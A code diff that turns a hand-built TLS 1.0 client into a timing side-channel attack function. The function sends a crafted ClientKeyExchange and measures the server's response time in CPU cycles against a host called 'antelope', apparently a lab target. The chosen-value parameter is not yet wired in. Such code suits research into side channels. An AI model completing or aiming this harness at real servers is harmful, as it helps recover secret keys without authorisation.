@@ -1,8 +1,9 @@
 import code
+import gc
 import io
+import rdtsc
 import secrets
 import socket
-import rdtsc
 
 from collections import namedtuple
 from tlslite.x509 import X509
@@ -271,7 +272,7 @@ class Handshake(namedtuple("Handshake", ["handshake_type", "body"])):
         return cls(handshake_type, body)
 
 
-class Record(namedtuple("Record", ["content_type", "version", "body", "raw"])):
+class Record(namedtuple("Record", ["content_type", "version", "body"])):
     def to_bytes(self):
         raw_content_type = self.content_type.to_bytes(1, byteorder="big")
         raw_version = self.version.to_bytes(2, byteorder="big")
@@ -297,11 +298,12 @@ class Record(namedtuple("Record", ["content_type", "version", "body", "raw"])):
 
         return cls(content_type, version, body, raw[0 : 5 + length])
 
+    def __len__(self):
+        return len(self.to_bytes())
 
-if __name__ == "__main__":
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(("antelope", 443))
 
+def handshake_attack(sock, g):
+    # -> Client Hello
     client_hello = Record(
         ContentType.handshake,
         TLS_VERSION_1_0,
@@ -317,40 +319,57 @@ if __name__ == "__main__":
                 [X509_CERT_TYPE_EXTENSION],
             ),
         ),
-        None,
     )
     sock.send(client_hello.to_bytes())
 
+    # <- ServerHello, Certificate, ServerHelloDone
     response = recvall(sock)
 
     server_hello = Record.from_bytes(response)
-    response = response[len(server_hello.raw) :]
+    offset = len(server_hello)
 
-    certificates = Record.from_bytes(response)
-    response = response[len(certificates.raw) :]
+    certificates = Record.from_bytes(response[offset:])
+    offset += len(certificates)
 
-    server_hello_done = Record.from_bytes(response)
-    response = response[len(server_hello_done.raw) :]
+    server_hello_done = Record.from_bytes(response[offset:])
 
+    # -> ClientKeyExchange, ChangeCipherSpec, HandshakeFinished
+    # Construct a ClientKeyExchange with the <g> given.
     client_key_exchange = Record(
         ContentType.handshake,
         TLS_VERSION_1_0,
         Handshake(HandshakeType.client_key_exchange, ClientKeyExchange(0)),
-        None,
     )
+    # Finish off the handshake process
     change_cipher_spec = Record(
         ContentType.change_cipher_spec, TLS_VERSION_1_0, ChangeCipherSpec()
     )
     encrypted_handshake = Record(ContentType.handshake, TLS_VERSION_1_0)
-    combined_message = (
+    # Concat these messages together and send at the same time. This
+    # should reduce the variance from network latencies.
+    final_message = (
         client_key_exchange.to_bytes()
         + change_cipher_spec.to_bytes()
         + encrypted_handshake.to_bytes()
     )
 
+    # Go!
     start_time = rdtsc.get_cycles()
-    sock.send(combined_message)
+
+    sock.send(final_message)
     response = recvall(sock)
+
     end_time = rdtsc.get_cycles()
+
+    return start_time, response, end_time
+
+
+if __name__ == "__main__":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(("antelope", 443))
+
+    gc.disable()
+    start, response, end = handshake_attack(sock, g=0)
+    gc.collect()
 
     code.interact(local=locals())
